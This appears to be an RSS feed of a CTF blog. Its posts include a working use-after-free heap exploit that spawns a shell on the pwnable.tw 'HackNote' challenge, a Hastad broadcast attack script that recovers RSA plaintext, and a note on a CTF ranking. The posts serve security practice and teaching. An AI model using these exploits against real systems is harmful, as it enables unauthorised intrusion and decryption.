<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>j0n9hyun</title>
    <link>http://j0n9hyun.github.io/</link>
    <atom:link href="/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>j0n9yhun&#39;s repository</description>
    <pubDate>Fri, 23 Aug 2019 10:01:46 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[Pwn.tw] HackNote</title>
      <link>http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/</link>
      <guid>http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/</guid>
      <pubDate>Sun, 21 Jul 2019 13:52:31 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;hacknote&quot;&gt;&lt;a class=&quot;markdownIt-An
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="hacknote"><a class="markdownIt-Anchor" href="#hacknote"></a> hacknote</h3><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10102</span>)</span><br><span class="line">e = ELF(<span class="string">'./hacknote'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> a, b: r.sendafter(a, b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b: r.sendlineafter(a, b)</span><br><span class="line">ex = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line"></span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">':'</span>, <span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">':'</span>, str(size))</span><br><span class="line">sa(<span class="string">':'</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sla(<span class="string">':'</span>, <span class="string">'2'</span>)</span><br><span class="line">sla(<span class="string">':'</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">sla(<span class="string">':'</span>, <span class="string">'3'</span>)</span><br><span class="line">sla(<span class="string">':'</span>, str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'A'</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(<span class="number">0x0804862B</span>) + p32(puts_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leaked = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = leaked - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>, p32(system_addr) + <span class="string">';sh\x00'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ex()</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/16969364/63584676-66370380-c5d8-11e9-9962-b85139965772.png" alt="Exploit"></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/07/21/Pwn-tw-HackNote/#disqus_thread</comments>
    </item>
    
    <item>
      <title>RSA Hastad Attack</title>
      <link>http://j0n9hyun.github.io/2019/07/12/RSA-Hastad/</link>
      <guid>http://j0n9hyun.github.io/2019/07/12/RSA-Hastad/</guid>
      <pubDate>Fri, 12 Jul 2019 06:39:06 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len(sys.argv)&lt;<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"\t\n\nArg error: python rsaHastad.py &lt;n0 File&gt; &lt;n1 File&gt; &lt;n2 File&gt; &lt;c0 File&gt; &lt;c1 File&gt; &lt;c2 File&gt; [--decimal/--hex/--b64] [-v/--verbose]\n\n"</span></span><br><span class="line">    exit()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t        RSA Hastad Attack         "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         JulesDT -- 2016          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t         License GNU/GPL          "</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chinese_remainder</span><span class="params">(n, a)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    prod = reduce(<span class="keyword">lambda</span> a, b: a*b, n)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> n_i, a_i <span class="keyword">in</span> zip(n, a):</span><br><span class="line">        p = prod / n_i</span><br><span class="line">        sum += a_i * mul_inv(p, n_i) * p</span><br><span class="line">    <span class="keyword">return</span> sum % prod</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_inv</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    b0 = b</span><br><span class="line">    x0, x1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a &gt; <span class="number">1</span>:</span><br><span class="line">        q = a / b</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">        x0, x1 = x1 - q * x0, x0</span><br><span class="line">    <span class="keyword">if</span> x1 &lt; <span class="number">0</span>: x1 += b0</span><br><span class="line">    <span class="keyword">return</span> x1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_invpow</span><span class="params">(x,n)</span>:</span></span><br><span class="line">    high = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> high ** n &lt; x:</span><br><span class="line">        high *= <span class="number">2</span></span><br><span class="line">    low = high/<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> low &lt; mid <span class="keyword">and</span> mid**n &lt; x:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">elif</span> high &gt; mid <span class="keyword">and</span> mid**n &gt; x:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> mid</span><br><span class="line">    <span class="keyword">return</span> mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseC</span><span class="params">(argv, index, verbose)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> string</span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    cmd = <span class="string">' '</span>.join(argv)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'--decimal'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as decimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--hex'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as hexadecimal input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">'--b64'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="keyword">if</span> verbose:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"## Considered as base64 input"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">        <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fileInput = long(fileInput)</span><br><span class="line">            <span class="keyword">if</span> verbose:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"## Guessed as decimal input"</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">            <span class="keyword">return</span> long(fileInput)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">if</span> all(c <span class="keyword">in</span> string.hexdigits <span class="keyword">for</span> c <span class="keyword">in</span> fileInput):</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as hexadecimal input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(fileInput,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span>,fileInput</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"## Guessed as base64 input"</span></span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"##"</span></span><br><span class="line">                <span class="keyword">return</span> long(binascii.hexlify(binascii.a2b_base64(fileInput)),<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseN</span><span class="params">(argv,index)</span>:</span></span><br><span class="line">    file = open(argv[index],<span class="string">'r'</span>)</span><br><span class="line">    fileInput = <span class="string">''</span>.join(file.readlines()).strip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fileInput = long(fileInput)</span><br><span class="line">        <span class="keyword">return</span> fileInput</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">        <span class="keyword">return</span> long(RSA.importKey(fileInput).__getattr__(<span class="string">'n'</span>))</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    cmd = <span class="string">' '</span>.join(sys.argv)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'-v'</span> <span class="keyword">in</span> cmd <span class="keyword">or</span> <span class="string">'--verbose'</span> <span class="keyword">in</span> cmd:</span><br><span class="line">        verbose = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        verbose = <span class="literal">False</span></span><br><span class="line">    n0 = parseN(sys.argv,<span class="number">1</span>)</span><br><span class="line">    n1 = parseN(sys.argv,<span class="number">2</span>)</span><br><span class="line">    n2 = parseN(sys.argv,<span class="number">3</span>)</span><br><span class="line">    n3 = parseN(sys.argv,<span class="number">4</span>)</span><br><span class="line">    n4 = parseN(sys.argv,<span class="number">5</span>)</span><br><span class="line">    n5 = parseN(sys.argv,<span class="number">6</span>)    </span><br><span class="line">    n6 = parseN(sys.argv,<span class="number">7</span>)    </span><br><span class="line">    </span><br><span class="line">    c0 = parseC(sys.argv,<span class="number">8</span>,verbose)</span><br><span class="line">    c1 = parseC(sys.argv,<span class="number">9</span>,verbose)</span><br><span class="line">    c2 = parseC(sys.argv,<span class="number">10</span>,verbose)</span><br><span class="line">    c3 = parseC(sys.argv,<span class="number">11</span>,verbose)</span><br><span class="line">    c4 = parseC(sys.argv,<span class="number">12</span>,verbose)</span><br><span class="line">    c5 = parseC(sys.argv,<span class="number">13</span>,verbose)    </span><br><span class="line">    c6 = parseC(sys.argv,<span class="number">14</span>,verbose)    </span><br><span class="line"></span><br><span class="line">    n = [n0,n1,n2,n3,n4,n5,n6]</span><br><span class="line">    a = [c0,c1,c2,c3,c4,c5,c6]</span><br><span class="line"></span><br><span class="line">    result = (chinese_remainder(n, a))</span><br><span class="line">    resultHex = str(hex(find_invpow(result,<span class="number">7</span>)))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Decoded Hex :\n"</span>,resultHex</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"---------------------------"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"As Ascii :\n"</span>,resultHex.decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"10022036265379037873283606776808482557866459308090111534883940865718177639983512662119342281119416241158033537298567286851709556229498058859877121683228774596682463530354223972067629198444968982788922250713559891865919261816911330848802614913631706032562776893224597357355324255263321117746371249374897281379618765006492730806494403308111072966637211560823960482878492897669436775113233218090173773953205373859777529204336743904524724605913439667291642450283502539056317167865950955271726411160185108661710605305209881749978968104668372320740311039079195405595564405545553067816984977942352952679613295335945453198237"</span> &gt; n0</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"5466545789924978392117734846441651025566944649290017587961487324101229594609777422305368037344954585418241587633957551279641772525768764611188988227720597556634650034264505822514430445671371902394845226110100975570935303274836520009041255673258743208173396958290432905543148641745168024380646078191379194650244323448918977124653886707963511968894925605598683697007725355334218510153808020236986866621440493131392397106674236875719949237921916816824901951782815445968997182425608119302657645645838081847911729329333764403590828687896595484627953582720022494684431177689169562431514156723717431880081981556861583018517"</span> &gt; n1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"5216273350923762348996819172932047657740263255248423536832070896504436079290996116053910458202206066607495080005143242081376348478552546332314483414339219088245406077072653291793201707938210052137737032136008691204273974883871392886847900590411035963981133018158012140770585855836554605968542686051767074445169576528595295868833612083435959789899465479063315706805137423972403304919456897675923521668190245644201632092213606749130854730067502251227674778549657054487536558408785381601255488927062660442522496864532745842104460605804514922118066012819002689049981557892095296223518873642160006462186453091627377846719"</span> &gt; n2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"23877677498268410284879275681599753946472064168982107017698987574875291853430610166705520818854679284024035965166084667071782959877626088875201104444061372210767667483286033873186027043018865270765379778972734594727020084433542927434622162385031073045949543728094450158066806302710336945902706311444702067892897382023369572561933840697091647190739941807440726157963736515169755622514090303488227644584510175870987096541366007967982302476854613123392400570876217436169696368690150208874814955767774660004903549034030453797617219708937501949676157124852802614561580437881345741238143591504284958256829966154954860310643"</span> &gt; n3</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"14095304106189288640829933284328100925981109805290171926596523882500992828050689610054551419208961617895244032677408948518722739184220513962788253695294440224817835843547289773514113860609727834208120554675150777100035341397359695754443831969620545126239117460426602273999534524462242741389375433175237422632997941648269022097426901783701566115072520388843879171454672942810241915423341751813855234874758865121037886735845464875242609743056346324057991215234482527871877337706502944703023808957350962273199545033462807203671480858363579332623386369851297631986187711675134368500976725781503614885257984375549898158689"</span> &gt; n4</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2805822354201662117320594043711993782804865769293499426012360087817858551003001395302163740603703828195195932459444805174556152674013174027197071452536007720377642902614079800876454139985267840390802982000981391589121247087945323071621814892873054291187100453510563927190923456819020327967812411342557586095287060637718034456241630931342321644065932761169946330107762168341828247523519427454538373734712173180277190763105614286976239296025622448068573996830818370176355468420604889972971911137825122031079799394840034520000378583048365213663261323826755042085539056699658078298352991498848183741926741253336809983081"</span> &gt; n5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"25454009749168470343695633209096091829115329722572151778843118833425745470034996921255287732666381145235781038972818879902175747917173596391714646458631517429967987558853821226063117620100131280109980358660151611745478185529770001530290709260636770225215186800776097876644514962324976911466656250316831758848397129882568596479711529118559633884457580705072157006277242414838614921959845416195868135339484150235079747708585021249992266719965641249640344662274664797188479304252760363884135230450876493335745378727727079727827645384850449255019980920544237025044248135670516643488962958548195014144666470074377908386063"</span> &gt; n6</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"7391172673494652807685679927464443742804469716124686497937352685631944739927403334100753118718810827819939551249092644730733640887813475157863909267732710966904033874563749607452101004880603517576015117231543666882714876053816889315304434716583902097326869862769223330226929267650196146699723546298777721549327230579524043853731525842228354074211952590809573512193002908675659981910521560218722078118583409532890190350278993572874200629804040761922640444870232404736174533503458666401049021690701120014711135662159756073554655169987524174160454336199103732766648969310872094773896573037726906071280884398964499625020"</span> &gt; c0</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2843216698827041985234155126413219625102551967694195507616270458944256794024725727982775312996964360225107871298400288303715856835949437523897251998356574507142899492557143968158430397540293189973986706379386430519381858403628687144765951766733259166975201698201001559608435647196300391229794290104430338488390377935687114237067952186727947306540592887865659962691657932063711547531829312199823488118775597548579002212505954186919111624039557627729228692097539779090276034544147566301508294383730646789567286167983001460941761651651550106133788841812817514137482151210600991083197714286954280138543861307503606716687"</span> &gt; c1</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2302840660982990706559514467752282608279989971179438892300937945447548784136021634663470424995563089657378083878340327507907273677046617011731588253183115962507981205380038591937454135692479378461272309601984068994340223460110011927750428790367899740123933101545519333275378177450046677349361228228756023343552737751276656981842493825940592644061106798477517795237715348144352954728534699021231559916391882314536204099649751257130666668855055343556693412599766542087842727824032038771853002304289245363376208213623603995010083510086051017014020583014841158059684157033215101586049552797894220844380611133865673630801"</span> &gt; c2</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"21542650580244090952784375188737468745448203348922868429406196302086271073676866277485976451720227641278427496915785578412784529024335740676758107987503859146577358215708248682437455044274509620470752764937668805057881069241160619380098319880566533327878406656365405208233812965208982731078254898819598904848966997244978017829737683687504578693319927257965587343277686790692897770069007188699761774062935389828173866322096724684461746266895396261083359145450376711339892131239899937109104845549497760224715797430549267596702844680269969086579967938513817206661072633561450576990683873838952925270459005180113251070249"</span> &gt; c3</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"5841298358718613696062311056221508337701416292725004974138314539876150378702426703549430117040191903647122061403407396288001626124108215908094632322171004807595060730467760110047822011747633210272450557602443585240325321882265082987790788937409746656818781811819115452970840966600299402274664167896074281874767663751931697405940475209595160606989446399735956632932740140774120362773964862067823210273048778380937955790417026758705126758582714675929109140032046187572583702405164513719448544031934183587141634161632757693697249167749952737814924049718225194470053426092226496663009906557955566430066736079650924094775"</span> &gt; c4</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"1840296233218477853481534562215626625414182376149520279565477106636326502423629202398872352247072974928247089059258779616805363438919346177179751144150840146502100528681001973857981344372271699254564085124019490542816704779558116713918712764905289545904746631301089653173086838314931849726257101196974182707388814949943497825270433233859953596462571591644141313685767121169211812959266024665387037379326240471760061808331954030889737904363024686917008151847474903564630772753685195974245871917099262116749552267414561620711561171348300446183668428521497810537883987976853838751652062973640912281502768323552961119727"</span> &gt; c5</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"789032093589329919433103064912734499692800138044594105985741187192587133548423627123979828515942204884228205644612915396782678903901468096055669312556620684388723470685365523376229767716532460150705694588934426363146781448912873886792079146178749619507171787017137430583992061952004088013585625578578697225347700205144867425958935656640766720643294601810945228322481781587820554087577038637902482084286507222529109418279162740318995563410236088568237694026601631788889001088963413678782229872782538151806577918829849586853938669782376616395525544507480942096894639889844916812413303666411186051339002485237155449662"</span> &gt; c6</span><br><span class="line"></span><br><span class="line">python rsaHastad.py n0 n1 n2 n3 n4 n5 n6 c0 c1 c2 c3 c4 c5 c6</span><br><span class="line"></span><br><span class="line">rm n0 n1 n2 n3 n4 n5 n6 c0 c1 c2 c3 c4 c5 c6</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/07/12/RSA-Hastad/#disqus_thread</comments>
    </item>
    
    <item>
      <title>2019 디미고 CTF 일반부 3등</title>
      <link>http://j0n9hyun.github.io/2019/07/07/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/</link>
      <guid>http://j0n9hyun.github.io/2019/07/07/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/</guid>
      <pubDate>Sun, 07 Jul 2019 12:40:25 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;한국디지털미디어고등학교-ctf-일반부-결과&quot;&gt;&lt;a class
        
      
      </description>
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="한국디지털미디어고등학교-ctf-일반부-결과"><a class="markdownIt-Anchor" href="#한국디지털미디어고등학교-ctf-일반부-결과"></a> 한국디지털미디어고등학교 CTF 일반부 결과</h3><p><img src="https://user-images.githubusercontent.com/16969364/60768543-28514f00-a100-11e9-9649-5ae3a1395670.PNG" alt="순위"></p>]]></content:encoded>
      
      <comments>http://j0n9hyun.github.io/2019/07/07/%EB%94%94%EB%AF%B8%EA%B3%A0-CTF-%EC%9D%BC%EB%B0%98%EB%B6%80-3%EB%93%B1/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Low Exponent Attack</title>
      <link>http://j0n9hyun.github.io/2019/07/06/Low-Exponent-Attack/</link>
      <guid>http://j0n9hyun.github.io/2019/07/06/Low-Exponent-Attack/</guid>
      <pubDate>Fri, 05 Jul 2019 15:14:23 GMT</pubDate>
      <description>
      
        
        
          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;h3 id=&quot;낮은-지수-공격&quot;&gt;&lt;a class=&quot;markdownIt-An
        
      
      </description>
      
